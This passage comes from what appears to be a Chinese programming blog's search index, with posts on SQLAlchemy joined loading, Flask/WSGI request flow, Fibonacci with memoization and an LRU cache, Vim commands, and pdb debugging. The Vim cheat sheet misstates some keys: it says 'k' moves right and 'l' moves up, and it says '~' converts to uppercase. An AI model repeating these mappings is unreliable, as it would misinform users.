addresses.id</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg.addresses</span><br><span class="line">[&lt;Address(email_address=<span class="string">'1111111111@xx.com'</span>)&gt;, &lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;]</span><br></pre></td></tr></table></figure><h3 id="加入载入"><a href="#加入载入" class="headerlink" title="加入载入"></a>加入载入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> joinedload</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg = session.query(User). \</span><br><span class="line">options(joinedload(User.addresses)).\</span><br><span class="line">filter(User.name == <span class="string">'hg'</span>).one()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hg.addresses</span><br><span class="line">[&lt;Address(email_address=<span class="string">'1111111111@xx.com'</span>)&gt;, &lt;Address(email_address=<span class="string">'2222222222@xx.com'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User). \</span><br><span class="line">options(joinedload(User.addresses)).\</span><br><span class="line">filter(User.name == <span class="string">'hg'</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password, addresses_1.id AS addresses_1_id, addresses_1.email_address AS addresses_1_email_address, addresses_1.user_id AS addresses_1_user_id </span><br><span class="line">FROM users LEFT OUTER JOIN addresses AS addresses_1 ON users.id = addresses_1.user_id </span><br><span class="line">WHERE users.name = %s</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><em><a href="http://docs.sqlalchemy.org/en/latest/orm/" target="_blank" rel="noopener">http://docs.sqlalchemy.org/en/latest/orm/</a></em></p>]]></content>
      
      <categories>
          
          <category> sqlalchemy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlalchemy -ORM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>flask基本处理流程</title>
      <link href="/flask%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">也许一个人在真正无可奈何的时候，除了微笑，也只好微笑了</blockquote><blockquote><p>搜集了一些资料,对flask处理流程有个宏观上的认识<br><img src="http://p5m1dtoh7.bkt.clouddn.com/flask%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B/20170111161405603.png" alt=""></p></blockquote><a id="more"></a><h2 id="WSGI"><a href="#WSGI" class="headerlink" title="WSGI"></a>WSGI</h2><p><code>WSGI</code>，全称 <code>Web Server Gateway Interface</code>，或者 <code>Python Web Server Gateway Interface</code> ，是为 <code>Python</code> 语言定义的 <code>Web</code> 服务器和 <code>Web</code> 应用程序或框架之间的一种简单而通用的接口。它是一个<code>Gateway</code>，也就是网关。网关的作用就是在协议之间进行转换。</p><p>很多框架都自带了 <code>WSGI server</code> ，比如 <code>Flask</code>，<code>webpy</code>，<code>Django</code>等。但是性能不好，自带的     <code>web server</code> 更多的是测试用途，发布时则使用生产环境的 <code>WSGI server</code>或者是联合 <code>nginx 做 uwsgi</code>。</p><p>在网上看到一张图有助于理解:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/flask%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B/20170111120835003.png" alt=""></p><p><code>WSGI</code>的使用方法实际上是包含在<code>APP</code>里面的，最右端的<code>app</code>实际上应该指的是逻辑功能，包括<code>URL</code>和<code>view function</code>的对应关系。</p><p><code>WSGI</code>其实是作为一个接口，来接受<code>Server</code>传递过来的信息, 然后通过这个接口调用后台<code>app</code>里的<code>view function</code>进行响应。</p><h2 id="flask基本处理流程"><a href="#flask基本处理流程" class="headerlink" title="flask基本处理流程"></a>flask基本处理流程</h2><p>处理关键步骤:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/flask%E5%9F%BA%E6%9C%AC%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B/20170111161405603.png" alt=""></p><p><em>注: environ为http的相关信息，如请求头等, start_response是响应信息</em></p>]]></content>
      
      <categories>
          
          <category> flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>使用缓存优化斐波那契</title>
      <link href="/%E4%BD%BF%E7%94%A8%E7%BC%93%E5%AD%98%E4%BC%98%E5%8C%96%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>网上看到某位大佬讲这个,自己也动手写写</p></blockquote><a id="more"></a><h2 id="cache优化"><a href="#cache优化" class="headerlink" title="cache优化"></a>cache优化</h2><p>通过缓存，如果计算过的值在缓存中，就不需要重复计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cache</span><span class="params">(func)</span>:</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">    @wraps(func)  # 消除装饰的副作用</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> n <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">            result = func(n)</span><br><span class="line">            data[n] = result</span><br><span class="line">        <span class="keyword">return</span> data[n]</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@cache</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib_use_cache</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib_use_cache(n - <span class="number">2</span>) + fib_use_cache(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib_none_cache</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib_none_cache(n - <span class="number">2</span>) + fib_none_cache(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># none cache</span></span><br><span class="line">    print(<span class="string">'none cache'</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        print(fib_none_cache(i))</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(<span class="string">'cost time:&#123;&#125;'</span>.format(end_time - start_time))</span><br><span class="line">    print(<span class="string">'-'</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># use cache</span></span><br><span class="line">    print(<span class="string">'use cache'</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        print(fib_use_cache(i))</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(<span class="string">'cost time:&#123;&#125;'</span>.format(end_time - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="缓存有限，使用LRUcache优化"><a href="#缓存有限，使用LRUcache优化" class="headerlink" title="缓存有限，使用LRUcache优化"></a>缓存有限，使用LRUcache优化</h2><p>使用双端链表加快添加和删除<br>使用LRU算法，维护最近使用过的，移除最近未使用的</p><p>大致流程:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/LRUcache/LRUcache.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, prev=None, next=None, key=None, value=None)</span>:</span></span><br><span class="line">        self.prev = prev</span><br><span class="line">        self.next = next</span><br><span class="line">        self.key = key</span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用循环双端链表,做到O(1)的删除和添加</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CircularDoubleLinkList</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.root_node = Node()</span><br><span class="line">        self.root_node.prev, self.root_node.next = self.root_node, self.root_node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">head_node</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.root_node.next</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tail_node</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.root_node.prev</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span><span class="params">(self, node)</span>:</span></span><br><span class="line">        tail_node = self.tail_node()</span><br><span class="line">        tail_node.next = node</span><br><span class="line">        node.prev = tail_node</span><br><span class="line">        node.next = self.root_node</span><br><span class="line">        self.root_node.prev = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self, node)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> node <span class="keyword">is</span> self.root_node:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        node.prev.next = node.next</span><br><span class="line">        node.next.prev = node.prev</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, max_size=<span class="number">16</span>)</span>:</span></span><br><span class="line">        self.max_size = max_size</span><br><span class="line">        self.cache = &#123;&#125;</span><br><span class="line">        self.access = CircularDoubleLinkList()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_full</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(self.cache) &gt;= self.max_size</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, func)</span>:</span></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(n)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> n <span class="keyword">in</span> self.cache:  <span class="comment"># 在缓存中</span></span><br><span class="line">                node = self.cache[n]</span><br><span class="line">                self.access.remove(node)</span><br><span class="line">                self.access.append(node)</span><br><span class="line">                res = node.value</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># 不在缓存中</span></span><br><span class="line">                new_value = func(n)</span><br><span class="line">                res = new_value</span><br><span class="line">                new_node = Node(key=n, value=new_value)</span><br><span class="line">                self.cache[n] = new_node</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> self.is_full():  <span class="comment"># 缓存full</span></span><br><span class="line">                    rm_node = self.access.head_node()</span><br><span class="line">                    self.access.remove(rm_node)</span><br><span class="line">                    <span class="keyword">del</span> self.cache[rm_node.key]</span><br><span class="line">                self.access.append(new_node)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@LRUCache()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib_use_lrucache</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib_use_lrucache(n - <span class="number">1</span>) + fib_use_lrucache(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib_none_cache</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib_none_cache(n - <span class="number">1</span>) + fib_none_cache(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># none cache</span></span><br><span class="line">    print(<span class="string">'none cache'</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        print(fib_none_cache(i))</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(<span class="string">'cost time:&#123;&#125;'</span>.format(end_time - start_time))</span><br><span class="line">    print(<span class="string">'-'</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># use lrucache</span></span><br><span class="line">    print(<span class="string">'use lrucache'</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        print(fib_use_lrucache(i))</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(<span class="string">'cost time:&#123;&#125;'</span>.format(end_time - start_time))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 斐波那契数列 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vim常用命令总结--经常翻看,就能熟练使用</title>
      <link href="/Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93--%E7%BB%8F%E5%B8%B8%E7%BF%BB%E7%9C%8B,%E5%B0%B1%E8%83%BD%E7%86%9F%E7%BB%83%E4%BD%BF%E7%94%A8.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">今天很残酷,明天也一样,后天也许会不同</blockquote><blockquote><p>使用 Vim 的时间不长，Vim一开始学习的时候，面对很多的操作命令要去记住，常常望而却步，因此整理了些常用命令。相信只要坚持使用，经常翻看，使用起来也会得心应手。</p></blockquote><a id="more"></a><h2 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>h,j,k,l</code> 或者 上下左右键</td><td style="text-align:left"><code>h</code>表示往左，<code>j</code>表示往下，<code>k</code>表示往右，<code>l</code>表示往上</td></tr><tr><td style="text-align:left"><code>ctrl+f</code></td><td style="text-align:left">下一页</td></tr><tr><td style="text-align:left"><code>ctrl+b</code></td><td style="text-align:left">上一页</td></tr><tr><td style="text-align:left"><code>o,O</code></td><td style="text-align:left">开启新的一行</td></tr><tr><td style="text-align:left"><code>^</code></td><td style="text-align:left">一行的开头</td></tr><tr><td style="text-align:left"><code>$</code></td><td style="text-align:left">一行的结尾</td></tr><tr><td style="text-align:left"><code>gg</code></td><td style="text-align:left">文件的开头</td></tr><tr><td style="text-align:left"><code>[N]G</code></td><td style="text-align:left">文件第N行(直接G到最后一行)</td></tr></tbody></table><h2 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>i</code></td><td style="text-align:left">插入到光标前面</td></tr><tr><td style="text-align:left"><code>I</code></td><td style="text-align:left">插入到一行的开头</td></tr><tr><td style="text-align:left"><code>a</code></td><td style="text-align:left">插入到光标后面</td></tr><tr><td style="text-align:left"><code>A</code></td><td style="text-align:left">插入到一行的最后</td></tr><tr><td style="text-align:left"><code>Esc</code></td><td style="text-align:left">退出插入模式</td></tr></tbody></table><h2 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>u</code></td><td style="text-align:left">撤销上一步操作</td></tr><tr><td style="text-align:left"><code>ctrl+r</code></td><td style="text-align:left">恢复上一步操作</td></tr><tr><td style="text-align:left"><code>.</code></td><td style="text-align:left">重复最后一个命令</td></tr><tr><td style="text-align:left"><code>~</code></td><td style="text-align:left">变为大写</td></tr><tr><td style="text-align:left"><code>[N]&gt;&gt;</code></td><td style="text-align:left">一行或N行右移一个tab键</td></tr><tr><td style="text-align:left"><code>[N]&lt;&lt;</code></td><td style="text-align:left">一行或N行左移一个tab键</td></tr></tbody></table><h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>w</code></td><td style="text-align:left">保存</td></tr><tr><td style="text-align:left"><code>wq</code></td><td style="text-align:left">保存并关闭</td></tr><tr><td style="text-align:left"><code>q</code></td><td style="text-align:left">关闭(已保存)</td></tr><tr><td style="text-align:left"><code>q!</code></td><td style="text-align:left">强制关闭，丢弃缓存区内容</td></tr></tbody></table><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>/pattern</code></td><td style="text-align:left">按照pattern搜索</td></tr><tr><td style="text-align:left"><code>?pattren</code></td><td style="text-align:left">向后搜索</td></tr><tr><td style="text-align:left"><code>n</code></td><td style="text-align:left">光标到达搜索结果的前一个目标</td></tr><tr><td style="text-align:left"><code>N</code></td><td style="text-align:left">光标到达搜索结果的后一个目标</td></tr></tbody></table><h2 id="视觉模式"><a href="#视觉模式" class="headerlink" title="视觉模式"></a>视觉模式</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>v</code></td><td style="text-align:left">选中一个或者多个字符(配合方向键使用)</td></tr><tr><td style="text-align:left"><code>V</code></td><td style="text-align:left">选中一行</td></tr></tbody></table><h2 id="剪切和复制"><a href="#剪切和复制" class="headerlink" title="剪切和复制"></a>剪切和复制</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>dd</code></td><td style="text-align:left">删除一行</td></tr><tr><td style="text-align:left"><code>D</code></td><td style="text-align:left">删除当前光标到一行的最后</td></tr><tr><td style="text-align:left"><code>x</code></td><td style="text-align:left">删除后一个字符</td></tr><tr><td style="text-align:left"><code>X</code></td><td style="text-align:left">删除前一个字符</td></tr><tr><td style="text-align:left"><code>[N]yy</code></td><td style="text-align:left">复制一行或者N行</td></tr><tr><td style="text-align:left"><code>p</code></td><td style="text-align:left">粘贴</td></tr></tbody></table><h2 id="窗口操作"><a href="#窗口操作" class="headerlink" title="窗口操作"></a>窗口操作</h2><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left"><code>:split</code></td><td style="text-align:left">水平分割出一个窗口</td></tr><tr><td style="text-align:left"><code>:vsplit</code></td><td style="text-align:left">垂直分割出一个窗口</td></tr><tr><td style="text-align:left"><code>close</code></td><td style="text-align:left">关闭窗口</td></tr><tr><td style="text-align:left"><code>ctrl+w</code></td><td style="text-align:left">切换窗口</td></tr></tbody></table>]]></content>
      
      <categories>
          
          <category> vim </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python3调试(debug)--pdb</title>
      <link href="/python3%E8%B0%83%E8%AF%95(debug)--pdb.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">得之坦然，失之淡然，顺其自然，争其必然</blockquote><blockquote><p><img src="https://i.ytimg.com/vi/bZZTeKPRSLQ/maxresdefault.jpg" alt=""></p></blockquote><a id="more"></a><h2 id="pdb调试"><a href="#pdb调试" class="headerlink" title="pdb调试"></a>pdb调试</h2><h3 id="pdb命令清单"><a href="#pdb命令清单" class="headerlink" title="pdb命令清单"></a>pdb命令清单</h3><p><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/pdb%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95.jpg" alt=""></p><p>忘记了方便查询</p><h3 id="两种使用调试器的方法"><a href="#两种使用调试器的方法" class="headerlink" title="两种使用调试器的方法"></a>两种使用调试器的方法</h3><p>可以这样启动调试：</p><ul><li>python -m pdb filename.py</li><li>import pdb;pdb.set_trace()</li></ul><p>下面的演示中使用的是第一种，实际中大多数会选择后者</p><h3 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">print(fib(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h4 id="在断点上设置命令"><a href="#在断点上设置命令" class="headerlink" title="在断点上设置命令"></a>在断点上设置命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) b line(需要下断点的行)</span><br><span class="line">(Pdb) commands num(第几个端点)</span><br><span class="line">(com) bt</span><br><span class="line">(com) args</span><br><span class="line">(com) end</span><br><span class="line">(Pdb)</span><br></pre></td></tr></table></figure><p>以上几个命令是断点处分别显示回溯栈，参数。bt表示back trace，args表示函数的参数</p><p>以下为我自己设置的几个断点:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B1-1.jpg" alt=""><br>效果:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B1-2.jpg" alt=""></p><p>也可以不用在命令处设置断点，使用如下方式也可以:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B1-3.jpg" alt=""><br>直接使用args会显示当前层的参数，bt会显示栈回溯</p><h4 id="u-up-与d-down"><a href="#u-up-与d-down" class="headerlink" title="u(up)与d(down)"></a>u(up)与d(down)</h4><p>在递归时可以使用u(up),d(down)来回到上一层或下一层栈，如下:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B1-4.jpg" alt=""></p><h4 id="从这个例子学到什么"><a href="#从这个例子学到什么" class="headerlink" title="从这个例子学到什么?"></a>从这个例子学到什么?</h4><p>从这个例子我们可以学到:</p><ul><li>端点可以处可以设置命令</li><li>args可以显示传递给方法的参数</li><li>bt可以显示栈回溯</li><li>c表示继续直达断点</li><li>u和d可以回到上一层或者下一层栈</li></ul><h3 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pointless_loop</span><span class="params">(n)</span>:</span></span><br><span class="line"></span><br><span class="line">    number_sum = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 这是一个无意义的循环</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span 